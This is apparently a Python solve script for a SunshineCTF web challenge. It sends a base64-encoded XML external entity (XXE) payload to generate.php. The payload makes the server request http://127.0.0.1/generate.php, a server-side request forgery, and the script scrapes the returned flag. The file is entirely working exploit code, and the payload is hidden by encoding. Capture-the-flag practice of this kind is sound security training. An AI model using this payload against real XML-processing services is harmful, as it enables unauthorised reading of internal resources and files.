#!/usr/bin/env python
import requests
import re

URL = "http://archive.sunshinectf.org:19007"

r = requests.get(URL+"/generate.php?input=PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iSVNPLTg4NTktMSI%2FPgogPCFET0NUWVBFIGZvbyBbIDwhRUxFTUVOVCBmb28gQU5ZID4KICAgPCFFTlRJVFkgeHhlIFNZU1RFTSAiaHR0cDovLzEyNy4wLjAuMS9nZW5lcmF0ZS5waHAiID5dPgogICAgPGlucHV0PgogICAgICAgPGZpcnN0TmFtZT4meHhlOzwvZmlyc3ROYW1lPgogICAgICAgPGxhc3ROYW1lPndldzwvbGFzdE5hbWU%2BCiAgICA8L2lucHV0Pg%3D%3D")
flag = re.findall("sun{.+?}", r.text)
if flag:
    print(flag[0])
else:
    print("RIP")
